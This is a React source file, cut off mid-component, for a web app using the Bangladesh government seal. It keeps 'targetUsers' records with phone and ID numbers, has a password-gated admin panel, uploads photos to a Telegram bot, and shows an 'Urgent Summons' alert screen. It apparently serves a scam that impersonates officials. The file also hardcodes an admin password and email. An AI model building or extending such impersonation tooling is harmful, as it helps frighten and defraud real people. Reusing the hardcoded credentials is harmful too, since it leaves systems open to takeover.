/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  Smartphone, 
  Globe, 
  UserCheck, 
  Info, 
  ExternalLink, 
  ChevronRight, 
  ChevronLeft,
  ShieldCheck, 
  PlaneTakeoff, 
  MoreVertical, 
  Lock, 
  Plus, 
  Edit2, 
  Trash2, 
  Save, 
  X, 
  Search,
  Send, 
  Download, 
  AlertTriangle,
  Phone,
  MessageCircle,
  Upload,
  Camera,
  Copy,
  CheckCircle2,
  ShieldAlert,
  Clock,
  LayoutDashboard,
  Users,
  Mail,
  Settings,
  FileText,
  Eye,
  Trash,
  Heart,
  Stethoscope,
  GraduationCap,
  UserPlus,
  Play,
  Pause,
  Sparkles
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import html2canvas from 'html2canvas';
import { 
  collection, 
  doc, 
  getDoc, 
  setDoc, 
  updateDoc, 
  deleteDoc, 
  onSnapshot,
  query,
  orderBy,
  serverTimestamp,
  getDocFromServer,
  getDocs,
  where
} from 'firebase/firestore';
import { 
  signInWithPopup, 
  GoogleAuthProvider, 
  onAuthStateChanged 
} from 'firebase/auth';
import { 
  ref, 
  uploadBytes, 
  getDownloadURL 
} from 'firebase/storage';
import { db, auth, storage } from './firebase';
import { QRCodeSVG } from 'qrcode.react';
import HelpCenter from './components/HelpCenter';

// --- Constants ---
const ADMIN_PASSWORD = '80102623';
const ADMIN_EMAIL = 'mdnazmulhuda8511@gmail.com';

// --- Error Handling ---
enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: any;
}

function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      isAnonymous: auth.currentUser?.isAnonymous,
    },
    operationType,
    path
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

// --- Types ---
interface TargetUser {
  id: string;
  name: string;
  phone: string;
  idNumber: string;
  country: string;
  photoUrl?: string;
  telegramChatId?: string;
  status: 'Ready' | 'Pending' | 'Processing';
  documents?: { name: string; url: string; type: string }[];
  createdAt?: any;
}

interface ContactInquiry {
  name: string;
  email: string;
  message: string;
  createdAt: any;
}

const Toast = ({ message, type, onClose }: { message: string; type: 'success' | 'error'; onClose: () => void }) => (
  <motion.div 
    initial={{ y: 50, opacity: 0 }}
    animate={{ y: 0, opacity: 1 }}
    exit={{ y: 50, opacity: 0 }}
    className={`fixed bottom-8 left-1/2 -translate-x-1/2 px-6 py-3 rounded-2xl shadow-2xl z-[100] flex items-center gap-3 font-bold ${type === 'success' ? 'bg-emerald-600 text-white' : 'bg-rose-600 text-white'}`}
  >
    {type === 'success' ? <CheckCircle2 size={20} /> : <AlertTriangle size={20} />}
    {message}
    <button onClick={onClose} className="ml-4 opacity-50 hover:opacity-100"><X size={16} /></button>
  </motion.div>
);

const ContactModal = ({ onClose, setToast }: { onClose: () => void; setToast: (t: { message: string; type: 'success' | 'error' } | null) => void }) => {
  const [formData, setFormData] = useState({ name: '', email: '', message: '' });
  const [isSending, setIsSending] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSending(true);
    try {
      const inquiryRef = doc(collection(db, 'inquiries'));
      await setDoc(inquiryRef, { ...formData, createdAt: serverTimestamp() });
      setToast({ message: 'আপনার বার্তা সফলভাবে পাঠানো হয়েছে। ধন্যবাদ!', type: 'success' });
      onClose();
    } catch (error) {
      console.error('Contact error:', error);
      setToast({ message: 'বার্তা পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।', type: 'error' });
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold flex items-center gap-2 text-emerald-700"><MessageCircle /> যোগাযোগ করুন</h2>
          <button onClick={onClose} className="p-2 hover:bg-slate-100 rounded-full"><X /></button>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">আপনার নাম</label>
            <input required className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.name} onChange={(e) => setFormData({ ...formData, name: e.target.value })} />
          </div>
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">ইমেইল</label>
            <input required type="email" className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.email} onChange={(e) => setFormData({ ...formData, email: e.target.value })} />
          </div>
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">বার্তা</label>
            <textarea required rows={4} className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.message} onChange={(e) => setFormData({ ...formData, message: e.target.value })} />
          </div>
          <button type="submit" disabled={isSending} className="w-full bg-emerald-600 text-white py-3 rounded-xl font-bold hover:bg-emerald-700 transition-all flex items-center justify-center gap-2">
            {isSending ? <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }} className="w-5 h-5 border-2 border-white border-t-transparent rounded-full" /> : <Send size={18} />}
            বার্তা পাঠান
          </button>
        </form>
      </motion.div>
    </div>
  );
};

const Skeleton = ({ className }: { className?: string }) => (
  <div className={`animate-pulse bg-slate-200 rounded ${className}`} />
);

const AdminPanel = ({ onClose, sendEmailNotification }: { onClose: () => void; sendEmailNotification: any }) => {
  const [password, setPassword] = useState('');
  const [isPasswordCorrect, setIsPasswordCorrect] = useState(false);
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [users, setUsers] = useState<TargetUser[]>([]);
  const [inquiries, setInquiries] = useState<any[]>([]);
  const [settings, setSettings] = useState({ emailNotifications: true, maintenanceMode: false, tgBotToken: '', tgChatId: '' });
  const [activeTab, setActiveTab] = useState<'users' | 'inquiries' | 'settings'>('users');
  const [searchQuery, setSearchQuery] = useState('');
  const [editingUser, setEditingUser] = useState<Partial<TargetUser> | null>(null);
  const [isAdding, setIsAdding] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (user && user.email === ADMIN_EMAIL) {
        setIsAuthorized(true);
      } else {
        setIsAuthorized(false);
      }
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (isAuthorized && isPasswordCorrect && auth.currentUser) {
      const q = query(collection(db, 'targetUsers'), orderBy('createdAt', 'desc'));
      const unsubscribeUsers = onSnapshot(q, (snapshot) => {
        const userData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as TargetUser));
        setUsers(userData);
      }, (error) => {
        handleFirestoreError(error, OperationType.LIST, 'targetUsers');
      });

      const qInquiries = query(collection(db, 'inquiries'), orderBy('createdAt', 'desc'));
      const unsubscribeInquiries = onSnapshot(qInquiries, (snapshot) => {
        const inquiryData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setInquiries(inquiryData);
      }, (error) => {
        handleFirestoreError(error, OperationType.LIST, 'inquiries');
      });

      const unsubscribeSettings = onSnapshot(doc(db, 'system', 'settings'), (docSnap) => {
        if (docSnap.exists()) {
          setSettings(docSnap.data() as any);
        }
      });

      return () => {
        unsubscribeUsers();
        unsubscribeInquiries();
        unsubscribeSettings();
      };
    }
  }, [isAuthorized, isPasswordCorrect]);

  const updateSettings = async (newSettings: any) => {
    try {
      await setDoc(doc(db, 'system', 'settings'), newSettings, { merge: true });
    } catch (error) {
      handleFirestoreError(error, OperationType.WRITE, 'system/settings');
    }
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsPasswordCorrect(true);
    } else {
      alert('ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।');
    }
  };

  const handleGoogleLogin = async () => {
    if (isLoggingIn) return;
    setIsLoggingIn(true);
    try {
      const provider = new GoogleAuthProvider();
      const result = await signInWithPopup(auth, provider);
      if (result.user.email !== ADMIN_EMAIL) {
        alert('আপনার ইমেইলটি এডমিন হিসেবে অনুমোদিত নয়।');
        await auth.signOut();
      }
    } catch (error: any) {
      if (error.code !== 'auth/cancelled-popup-request' && error.code !== 'auth/popup-closed-by-user') {
        console.error('Auth error:', error);
        alert('Google Login failed. Please try again.');
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const uploadToTelegram = async (file: File) => {
    setIsUploading(true);
    try {
      const formData = new FormData();
      formData.append('photo', file);

      const response = await fetch('/api/upload-photo', {
        method: 'POST',
        body: formData,
      });

      const data = await response.json();
      if (data.success) {
        setEditingUser(prev => prev ? ({ ...prev, photoUrl: data.fileUrl }) : null);
      } else {
        console.warn('Telegram Upload failed, falling back to Firebase Storage:', data.error);
        try {
          const storageRef = ref(storage, `photos/${Date.now()}_${file.name}`);
          const uploadResult = await uploadBytes(storageRef, file);
          const fileUrl = await getDownloadURL(uploadResult.ref);
          setEditingUser(prev => prev ? ({ ...prev, photoUrl: fileUrl }) : null);
          alert('Note: Telegram token is Unauthorized/Unconfigured. Photo was successfully uploaded to Firebase Storage instead.');
        } catch (firebaseError) {
          console.error('Firebase Storage fallback failed:', firebaseError);
          alert('Upload Failed on both Telegram and Firebase Storage: ' + (data.error || 'Unknown error'));
        }
      }
    } catch (error) {
      console.warn('Telegram upload request error, trying Firebase Storage:', error);
      try {
        const storageRef = ref(storage, `photos/${Date.now()}_${file.name}`);
        const uploadResult = await uploadBytes(storageRef, file);
        const fileUrl = await getDownloadURL(uploadResult.ref);
        setEditingUser(prev => prev ? ({ ...prev, photoUrl: fileUrl }) : null);
        alert('Note: Telegram upload failed. Photo was successfully uploaded to Firebase Storage.');
      } catch (firebaseError) {
        console.error('Firebase Storage fallback failed:', firebaseError);
        alert('Upload failed.');
      }
    } finally {
      setIsUploading(false);
    }
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingUser) return;
    setIsSaving(true);

    try {
      const userData = {
        ...editingUser,
        createdAt: editingUser.createdAt || serverTimestamp(),
        status: editingUser.status || 'Ready'
      };

      if (isAdding) {
        const newDocRef = doc(collection(db, 'targetUsers'));
        await setDoc(newDocRef, userData);
      } else if (editingUser.id) {
        const oldUser = users.find(u => u.id === editingUser.id);
        await updateDoc(doc(db, 'targetUsers', editingUser.id), userData);
        
        // Send notification if status changed and enabled
        if (settings.emailNotifications && oldUser && userData.status !== oldUser.status) {
          sendEmailNotification(userData.email || 'user@example.com', userData.name, userData.status, 'status');
        }
      }
      
      setEditingUser(null);
      setIsAdding(false);
    } catch (error) {
      handleFirestoreError(error, OperationType.WRITE, 'targetUsers');
    } finally {
      setIsSaving(false);
    }
  };

  const handleDelete = async (id: string) => {
    if (window.confirm('আপনি কি নিশ্চিত যে আপনি এই তথ্যটি মুছে ফেলতে চান?')) {
      try {
        await deleteDoc(doc(db, 'targetUsers', id));
      } catch (error) {
        handleFirestoreError(error, OperationType.DELETE, `targetUsers/${id}`);
      }
    }
  };

  if (!isAuthorized || !isPasswordCorrect) {
    return (
      <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold flex items-center gap-2"><Lock className="text-emerald-600" /> Admin Access</h2>
            <button onClick={onClose} className="p-2 hover:bg-slate-100 rounded-full"><X /></button>
          </div>
          <div className="space-y-6">
            {!isAuthorized ? (
              <div className="text-center space-y-4">
                <p className="text-slate-600 text-sm">এডমিন প্যানেলে প্রবেশের জন্য আপনার Google অ্যাকাউন্ট দিয়ে লগইন করুন।</p>
                <button onClick={handleGoogleLogin} disabled={isLoggingIn} className="w-full flex items-center justify-center gap-3 bg-white border border-slate-200 py-3 rounded-xl font-bold hover:bg-slate-50 transition-all shadow-sm disabled:opacity-50 disabled:cursor-not-allowed">
                  {isLoggingIn ? <div className="w-5 h-5 border-2 border-slate-300 border-t-emerald-600 rounded-full animate-spin"></div> : <LayoutDashboard size={20} />}
                  {isLoggingIn ? 'অপেক্ষা করুন...' : 'Google দিয়ে লগইন করুন'}
                </button>
              </div>
            ) : (
              <form onSubmit={handlePasswordSubmit} className="space-y-4">
                <div className="bg-emerald-50 p-3 rounded-xl flex items-center gap-2 mb-4">
                  <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                  <p className="text-xs text-emerald-700 font-bold">লগইন সফল: {auth.currentUser?.email}</p>
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">সিকিউরিটি পাসওয়ার্ড দিন</label>
                  <input type="password" className="w-full px-4 py-3 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-500 outline-none" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter password..." />
                </div>
                <button type="submit" className="w-full bg-emerald-600 text-white py-3 rounded-xl font-bold hover:bg-emerald-700 transition-all">প্যানেলে প্রবেশ করুন</button>
                <button type="button" onClick={() => auth.signOut()} className="w-full text-slate-400 text-xs font-bold hover:text-slate-600">অন্য অ্যাকাউন্ট দিয়ে লগইন করুন</button>
              </form>
            )}
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-slate-50 z-50 flex overflow-hidden">
      {/* Sidebar Navigation */}
      <aside className="w-64 bg-slate-900 text-white flex flex-col">
        <div className="p-6 border-b border-white/10">
          <div className="flex items-center gap-3">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-10 h-10 brightness-0 invert" referrerPolicy="no-referrer" />
            <div>
              <h2 className="font-black text-xs uppercase tracking-widest">Admin Panel</h2>
              <p className="text-[8px] opacity-50 uppercase tracking-widest">Gov. of Bangladesh</p>
            </div>
          </div>
        </div>
        
        <nav className="flex-1 p-4 space-y-2">
          <button onClick={() => setActiveTab('users')} className={`w-full flex items-center gap-3 p-3 rounded-xl transition-all ${activeTab === 'users' ? 'bg-gov-green text-white' : 'text-slate-400 hover:bg-white/5'}`}>
            <Users size={20} /> <span className="font-bold text-sm">User Management</span>
          </button>
          <button onClick={() => setActiveTab('inquiries')} className={`w-full flex items-center gap-3 p-3 rounded-xl transition-all ${activeTab === 'inquiries' ? 'bg-gov-green text-white' : 'text-slate-400 hover:bg-white/5'}`}>
            <Mail size={20} /> <span className="font-bold text-sm">Inquiries</span>
          </button>
          <button onClick={() => setActiveTab('settings')} className={`w-full flex items-center gap-3 p-3 rounded-xl transition-all ${activeTab === 'settings' ? 'bg-gov-green text-white' : 'text-slate-400 hover:bg-white/5'}`}>
            <Settings size={20} /> <span className="font-bold text-sm">Settings</span>
          </button>
        </nav>

        <div className="p-4 border-t border-white/10">
          <button onClick={onClose} className="w-full flex items-center justify-center gap-2 p-3 bg-white/5 hover:bg-white/10 rounded-xl transition-all text-sm font-bold">
            <X size={18} /> Exit Dashboard
          </button>
        </div>
      </aside>

      {/* Main Content Area */}
      <main className="flex-1 overflow-y-auto bg-slate-50">
        <header className="bg-white border-b border-slate-200 p-6 flex flex-col md:flex-row justify-between items-center sticky top-0 z-10 gap-4">
          <div className="flex flex-col">
            <h1 className="text-2xl font-black text-slate-800 capitalize">{activeTab} Dashboard</h1>
            <p className="text-xs text-slate-400 font-bold">Manage system {activeTab} and configurations</p>
          </div>
          
          <div className="flex items-center gap-4 w-full md:w-auto">
            {activeTab === 'users' && (
              <>
                <div className="relative flex-1 md:w-64">
                  <input 
                    type="text" 
                    placeholder="Search users..." 
                    className="w-full pl-10 pr-4 py-2 bg-slate-100 border border-slate-200 rounded-xl text-sm outline-none focus:ring-2 focus:ring-gov-green"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                  />
                  <Users className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" size={16} />
                </div>
                <button onClick={() => { setEditingUser({}); setIsAdding(true); }} className="bg-gov-green text-white px-6 py-2 rounded-xl font-bold flex items-center gap-2 hover:bg-emerald-800 transition-all shadow-lg shadow-emerald-900/20 whitespace-nowrap">
                  <Plus size={18} /> Add New User
                </button>
              </>
            )}
          </div>
        </header>

        <div className="p-8">
          {activeTab === 'users' && (
            <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm">
              <table className="w-full text-left border-collapse">
                <thead className="bg-slate-50 border-b border-slate-200">
                  <tr>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest">Photo</th>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest">Name</th>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest">Phone</th>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest">ID No.</th>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest">Status</th>
                    <th className="px-6 py-4 font-bold text-slate-600 text-xs uppercase tracking-widest text-right">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100">
                  {users
                    .filter(u => 
                      u.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
                      u.phone.includes(searchQuery) || 
                      u.idNumber.includes(searchQuery)
                    )
                    .map(user => (
                    <tr key={user.id} className="hover:bg-slate-50/50 transition-colors">
                      <td className="px-6 py-4">
                        {user.photoUrl ? (
                          <img src={user.photoUrl} alt="" className="w-10 h-10 rounded-full object-cover border border-slate-200" referrerPolicy="no-referrer" />
                        ) : (
                          <div className="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center"><Camera size={16} className="text-slate-400" /></div>
                        )}
                      </td>
                      <td className="px-6 py-4 font-bold text-slate-800">{user.name}</td>
                      <td className="px-6 py-4 text-slate-600 text-sm">{user.phone}</td>
                      <td className="px-6 py-4 text-slate-600 font-mono text-xs">{user.idNumber}</td>
                      <td className="px-6 py-4">
                        <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
                          user.status === 'Ready' ? 'bg-emerald-100 text-emerald-700' :
                          user.status === 'Pending' ? 'bg-amber-100 text-amber-700' :
                          'bg-blue-100 text-blue-700'
                        }`}>
                          {user.status}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-right">
                        <div className="flex justify-end gap-2">
                          <button onClick={() => { setEditingUser(user); setIsAdding(false); }} className="p-2 text-blue-600 hover:bg-blue-50 rounded-lg"><Edit2 size={18} /></button>
                          <button onClick={() => handleDelete(user.id)} className="p-2 text-red-600 hover:bg-red-50 rounded-lg"><Trash2 size={18} /></button>
                          <a href={`/?id=${user.id}`} target="_blank" rel="noreferrer" className="p-2 text-emerald-600 hover:bg-emerald-50 rounded-lg"><ExternalLink size={18} /></a>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {activeTab === 'inquiries' && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {inquiries.map(inquiry => (
                <div key={inquiry.id} className={`bg-white p-6 rounded-3xl border border-slate-200 shadow-sm space-y-4 relative ${inquiry.read ? 'opacity-60' : ''}`}>
                  {!inquiry.read && <div className="absolute top-4 left-4 w-2 h-2 bg-gov-red rounded-full"></div>}
                  <div className="flex justify-between items-start">
                    <div className={inquiry.read ? '' : 'pl-4'}>
                      <h3 className="font-black text-slate-800">{inquiry.name}</h3>
                      <p className="text-xs text-slate-500 font-bold">{inquiry.email}</p>
                    </div>
                    <span className="text-[10px] font-bold text-slate-400 uppercase">{new Date(inquiry.createdAt?.seconds * 1000).toLocaleDateString()}</span>
                  </div>
                  <p className="text-sm text-slate-600 leading-relaxed bg-slate-50 p-4 rounded-xl border border-slate-100 italic">"{inquiry.message}"</p>
                  <div className="flex gap-2">
                    {!inquiry.read && (
                      <button 
                        onClick={async () => {
                          await updateDoc(doc(db, 'inquiries', inquiry.id), { read: true });
                        }}
                        className="flex-1 bg-slate-100 text-slate-600 py-2 rounded-xl text-xs font-bold hover:bg-slate-200 transition-all"
                      >
                        Mark as Read
                      </button>
                    )}
                    <button className="flex-1 bg-gov-green text-white py-2 rounded-xl text-xs font-bold hover:bg-emerald-800 transition-all">Reply via Email</button>
                    <button onClick={async () => {
                      if (window.confirm('Delete this inquiry?')) {
                        await deleteDoc(doc(db, 'inquiries', inquiry.id));
                      }
                    }} className="p-2 text-red-600 hover:bg-red-50 rounded-xl transition-all"><Trash size={18} /></button>
                  </div>
                </div>
              ))}
              {inquiries.length === 0 && <div className="col-span-2 text-center py-20 text-slate-400 font-bold">No inquiries found.</div>}
            </div>
          )}

          {activeTab === 'settings' && (
            <div className="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm max-w-2xl">
              <h3 className="text-xl font-black text-slate-800 mb-6 font-sans">System Settings</h3>
              <div className="space-y-6">
                <div className="flex items-center justify-between p-4 bg-slate-50 rounded-2xl">
                  <div>
                    <p className="font-bold text-slate-800">Email Notifications</p>
                    <p className="text-xs text-slate-500">Send automatic emails on status changes</p>
                  </div>
                  <button 
                    onClick={() => updateSettings({ emailNotifications: !settings.emailNotifications })}
                    className={`w-12 h-6 rounded-full relative transition-all ${settings.emailNotifications ? 'bg-gov-green' : 'bg-slate-300'}`}
                  >
                    <div className={`absolute top-1 w-4 h-4 bg-white rounded-full transition-all ${settings.emailNotifications ? 'right-1' : 'left-1'}`}></div>
                  </button>
                </div>
                <div className="flex items-center justify-between p-4 bg-slate-50 rounded-2xl">
                  <div>
                    <p className="font-bold text-slate-800">Maintenance Mode</p>
                    <p className="text-xs text-slate-500">Temporarily disable public access</p>
                  </div>
                  <button 
                    onClick={() => updateSettings({ maintenanceMode: !settings.maintenanceMode })}
                    className={`w-12 h-6 rounded-full relative transition-all ${settings.maintenanceMode ? 'bg-gov-red' : 'bg-slate-300'}`}
                  >
                    <div className={`absolute top-1 w-4 h-4 bg-white rounded-full transition-all ${settings.maintenanceMode ? 'right-1' : 'left-1'}`}></div>
                  </button>
                </div>

                <div className="border-t border-slate-200 pt-6 mt-6">
                  <h4 className="text-slate-800 font-bold mb-4 flex items-center gap-2">
                    <Send className="text-gov-green" size={18} /> Telegram Notification Bot Config
                  </h4>
                  <div className="space-y-4">
                    <div>
                      <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Telegram Bot Token</label>
                      <input
                        type="text"
                        placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ"
                        className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green focus:bg-white text-xs font-mono"
                        value={settings.tgBotToken || ''}
                        onChange={(e) => setSettings({ ...settings, tgBotToken: e.target.value })}
                      />
                    </div>
                    <div>
                      <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Telegram Chat ID (Channel/Group/User)</label>
                      <input
                        type="text"
                        placeholder="e.g. -100123456789 or 987654321"
                        className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green focus:bg-white text-xs font-mono"
                        value={settings.tgChatId || ''}
                        onChange={(e) => setSettings({ ...settings, tgChatId: e.target.value })}
                      />
                    </div>
                    <button
                      onClick={async () => {
                        try {
                          await updateSettings({
                            tgBotToken: settings.tgBotToken || '',
                            tgChatId: settings.tgChatId || ''
                          });
                          alert('Telegram Dynamic Bot Credentials registered in database and synced to server successfully!');
                        } catch (err: any) {
                          alert('Failed to save settings: ' + (err.message || err));
                        }
                      }}
                      className="bg-gov-green text-white hover:bg-emerald-800 transition-all font-bold text-xs px-5 py-2.5 rounded-xl cursor-pointer"
                    >
                      Save Telegram Bot Config
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Edit/Add Modal (Same as before but styled better) */}
      <AnimatePresence>
        {editingUser && (
          <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[60] flex items-center justify-center p-4">
            <motion.div initial={{ y: 50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 50, opacity: 0 }} className="bg-white rounded-3xl p-8 max-w-lg w-full shadow-2xl">
              <h3 className="text-2xl font-black mb-6 text-slate-800">{isAdding ? 'Add New User' : 'Edit User Profile'}</h3>
              <form onSubmit={handleSave} className="space-y-4">
                <div className="flex flex-col items-center mb-6">
                  <div className="relative group cursor-pointer" onClick={() => fileInputRef.current?.click()}>
                    {editingUser.photoUrl ? (
                      <img src={editingUser.photoUrl} alt="" className="w-24 h-24 rounded-full object-cover border-4 border-emerald-100 shadow-lg" referrerPolicy="no-referrer" />
                    ) : (
                      <div className="w-24 h-24 rounded-full bg-slate-100 flex items-center justify-center border-4 border-slate-50 shadow-inner"><Camera size={32} className="text-slate-300" /></div>
                    )}
                    <div className="absolute inset-0 bg-black/40 rounded-full opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
                      <Upload className="text-white" size={24} />
                    </div>
                    {isUploading && (
                      <div className="absolute inset-0 bg-white/80 rounded-full flex items-center justify-center">
                        <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-6 h-6 border-2 border-emerald-600 border-t-transparent rounded-full" />
                      </div>
                    )}
                  </div>
                  <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={(e) => e.target.files?.[0] && uploadToTelegram(e.target.files[0])} />
                  <p className="text-[10px] text-slate-400 mt-2 font-black uppercase tracking-widest">Upload Profile Photo</p>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="col-span-2">
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Full Name</label>
                    <input required className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green transition-all" value={editingUser.name || ''} onChange={(e) => setEditingUser({ ...editingUser, name: e.target.value })} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Phone Number</label>
                    <input required className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green transition-all" value={editingUser.phone || ''} onChange={(e) => setEditingUser({ ...editingUser, phone: e.target.value })} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">ID Number</label>
                    <input required className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green transition-all" value={editingUser.idNumber || ''} onChange={(e) => setEditingUser({ ...editingUser, idNumber: e.target.value })} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Country</label>
                    <input required className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green transition-all" value={editingUser.country || ''} onChange={(e) => setEditingUser({ ...editingUser, country: e.target.value })} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Status</label>
                    <select className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-gov-green transition-all" value={editingUser.status || 'Ready'} onChange={(e) => setEditingUser({ ...editingUser, status: e.target.value as any })}>
                      <option value="Ready">Ready</option>
                      <option value="Pending">Pending</option>
                      <option value="Processing">Processing</option>
                    </select>
                  </div>
                </div>
                <div className="flex gap-4 mt-8">
                  <button type="submit" disabled={isSaving} className="flex-1 bg-gov-green text-white py-4 rounded-xl font-black uppercase tracking-widest hover:bg-emerald-800 transition-all shadow-lg shadow-emerald-900/20 flex items-center justify-center gap-2">
                    {isSaving && <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-5 h-5 border-2 border-white border-t-transparent rounded-full" />}
                    Save Profile
                  </button>
                  <button type="button" onClick={() => setEditingUser(null)} className="flex-1 bg-slate-100 text-slate-700 py-4 rounded-xl font-black uppercase tracking-widest hover:bg-slate-200 transition-all">Cancel</button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const UrgentSummonsModal = ({ user, onClose }: { user: TargetUser; onClose: () => void }) => {
  return (
    <div className="fixed inset-0 bg-black/95 backdrop-blur-xl z-[100] flex items-center justify-center p-4 overflow-y-auto">
      <motion.div 
        initial={{ scale: 0.8, opacity: 0, y: 50 }} 
        animate={{ scale: 1, opacity: 1, y: 0 }} 
        className="bg-white rounded-[2rem] max-w-lg w-full shadow-[0_0_50px_rgba(244,42,65,0.3)] border-4 border-gov-red overflow-hidden my-8"
      >
        <div className="bg-gov-red p-6 text-white text-center relative">
          <div className="absolute top-4 right-4 animate-pulse">
            <ShieldAlert size={32} className="text-amber-400" />
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-16 h-16 mx-auto mb-4 brightness-0 invert" referrerPolicy="no-referrer" />
